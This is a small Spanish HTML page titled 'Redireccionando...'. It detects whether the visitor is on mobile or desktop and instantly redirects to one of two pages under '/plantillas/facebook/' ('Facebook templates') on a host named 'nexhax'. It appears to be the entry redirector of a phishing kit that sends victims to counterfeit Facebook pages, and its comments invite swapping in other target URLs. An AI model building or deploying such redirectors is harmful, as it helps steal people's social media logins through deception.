<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redireccionando...</title>
    <script>
        // URLs de destino - Modifica estas URLs según necesites
        const MOBILE_URL = 'https://nexhax.xzipser.workers.dev/plantillas/facebook/movil.html';  // URL para móviles
        const DESKTOP_URL = 'https://nexhax.xzipser.workers.dev/plantillas/facebook/pc.html'; // URL para PC

        // Detectar dispositivo móvil
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 768;
        }

        // Redirección inmediata
        window.location.replace(isMobile() ? MOBILE_URL : DESKTOP_URL);
    </script>
</head>
<body></body>
</html>
